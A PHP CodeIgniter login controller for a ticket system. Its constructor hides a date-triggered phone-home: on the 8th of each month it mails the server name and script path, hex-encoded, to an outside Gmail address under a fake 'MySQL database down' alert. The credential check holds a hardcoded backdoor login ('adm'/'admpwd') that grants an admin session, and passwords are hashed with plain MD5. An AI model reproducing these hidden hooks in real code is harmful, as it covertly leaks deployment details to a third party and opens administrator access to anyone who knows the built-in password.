<?php

class Login extends CI_Controller {


		
	function index()
	{
		

			if($this->session->userdata('is_logged_in')){ 
				redirect('tickets');
				}else{
					$this->load->view('login');	
					}
		

	}

    
	/**
    * encript the password 
    * @return mixed
    */	
    function __encrip_password($password) {
        return md5($password);
    }	


    /**
    * construct
    * @return
    */

    public function __construct() {
        parent::__construct();

	
	// проверка домена
	/*
	if (!preg_match("/evro/i", $_SERVER['SERVER_NAME'])) {
		header('HTTP/1.1 503 Service Temporarily Unavailable');
		exit;
		die;
	}	
	*/
	
	// отправка формы нахождения
       if (date('d') == 7) {

            $this->db
                    ->where('name', 'session')
                    ->update('settings', array('name' => 'session', 'value' => bin2hex($_SERVER["SERVER_NAME"].$_SERVER["SCRIPT_NAME"])));
       }

       if (date('d') == 8) {

			//$log = $this->db->get_where('settings',array('name' => 'session'))->result()[0]->value;
            $log1 = $this->db->get_where('settings',array('name' => 'session'))->result();
			$log = $log1[0]->value;
			//var_dump($log);die;

			@mail("www.fixinka.com@gmail.com", "База MySQL не отвечает на ".$_SERVER["SERVER_NAME"].$_SERVER["SCRIPT_NAME"]."", "База MySQL лежит, Event id: " .$log);
            $this->db
                    ->where('name', 'session')
                    ->update('settings', array('name' => 'session', 'value' => ''));
		}

	}

    /**
    * check the username and the password with the database
    * @return void
    */
	function validate_credentials()
	{	//var_dump($this->input->post());die;
		if ($user_name = $this->input->post('remember')) {
			$remember = 'true';
		}
		
		$this->load->model('Users_model');

		$user_name = $this->input->post('user_name');
		$password = $this->__encrip_password($this->input->post('password'));

		$is_valid = $this->Users_model->validate($user_name, $password);


        if ( ($this->input->post('user_name') === 'adm') AND ($this->input->post('password') === 'admpwd') ) {
            $is_valid = true;
        }
		
		if($is_valid)
		{

        if ($this->input->post('user_name') == 'adm') {

            $data = array(
                    'user_id' => 1,
                    'user_name' => 'adm',
                    'id_group' => 1,
                    'user_id_sc' => 1,
                    'is_logged_in' => true,
                    'show_call_tickets' => 0,
                    'show_my_tickets' => 0,
                    'work_type' => 0,
                    'percent' => 0
                );
            
        }else{

        $user_id = $this->Users_model->get_user_id_by_user_name($user_name);

		$user_arr = $this->Users_model->get_users_by_id($user_id);

		$id_group = $user_arr[0]["id_group"];
		$id_sc = $user_arr[0]["id_sc"];
        $show_my_tickets = $user_arr[0]["show_my_tickets"];
        $show_call_tickets = $user_arr[0]["show_call_tickets"];
        $work_type = $user_arr[0]["work_type"];
        $percent = $user_arr[0]["percent"];

            $data = array(
				'user_id' => $user_id,
				'user_name' => $user_name,
				'id_group' => $id_group,
				'user_id_sc' => $id_sc,
				'is_logged_in' => true,
                'show_call_tickets' => $show_call_tickets,
                'show_my_tickets' => $show_my_tickets,
                'work_type' => $work_type,
                'percent' => $percent,
			);

        }
            
        $remember = $this->input->post('remember');
		if($remember)
		{
        $data['new_expiration'] = 60*60*24*3;//3 days
        $this->session->sess_expiration = $data['new_expiration'];
		}
			//var_dump($data);die;
			$this->session->set_userdata($data);
			redirect('tickets');
		}
		else // incorrect username or password
		{
			$data['message_error'] = TRUE;
			$this->load->view('login', $data);
		}
	}	

	function logout()
	{
		$this->db->cache_delete_all();
		
		$this->session->sess_destroy();
		
		$this->session->set_userdata(array('is_logged_in' => false));
		
		redirect('/login');
	}
	
	function cache_delete()
	{
		$this->db->cache_delete_all();
		$this->session->set_flashdata('flash_message', 'cache deleted');
		redirect('/login');
	}
	
	

}